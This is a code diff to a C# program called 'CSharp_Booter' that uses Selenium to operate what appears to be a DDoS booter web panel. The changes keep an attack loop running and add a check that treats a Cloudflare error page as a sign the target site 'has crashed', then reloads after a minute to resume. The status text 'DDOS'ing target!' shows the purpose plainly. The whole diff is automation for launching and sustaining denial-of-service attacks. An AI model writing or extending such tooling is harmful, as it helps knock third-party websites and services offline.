@@ -55,7 +55,7 @@ namespace CSharp_Booter
 
             await Task.Delay( 10000 );
 
-            while( true && Program.formInstance.isEnabled ) {
+            while( Program.formInstance.isEnabled ) {
                 try { // alert-success
                     IWebElement checkSuccess = driver.FindElement( By.CssSelector(".alert-success") );
                     Program.formInstance.setAction( "DDOS'ing target!" );
@@ -121,6 +121,16 @@ namespace CSharp_Booter
             }
             */
             #endregion
+
+            try { // check if site has crashed
+                driver.FindElement( By.ClassName( "cf-wrapper" ) ); // if found, then site has crashed
+                Program.formInstance.setAction( "Site has crashed, reloading after 1 minute!" );
+                await Task.Delay( TimeSpan.FromMinutes(1) );
+                driver.Navigate().Refresh();
+                await Task.Delay( TimeSpan.FromSeconds( 10 ) );
+            } catch( NoSuchElementException e ) {
+                // no action.
+            }
 
             IWebElement inputBox = null;
             try
